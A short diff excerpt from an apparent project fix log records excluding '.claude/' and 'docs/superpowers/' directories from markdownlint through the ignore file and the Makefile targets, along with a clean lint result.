+Fix: Added `.claude/` and `docs/superpowers/` to `.markdownlintignore` AND extended
+the explicit glob exclusions in both `lint-markdown` and `format-markdown` Makefile
+targets (`"#node_modules" "#.worktrees" "#.claude" "#docs/superpowers"`). Both
+mechanisms together because markdownlint-cli2 prefers explicit args over the
+ignorefile when both are present.
+Fixed: 2026-05-25
+Notes: After fix, `make lint-markdown` reports `Linting: 52 file(s) Summary: 0 error(s)`.
 
 ### Pass 15 — 2026-05-25
 
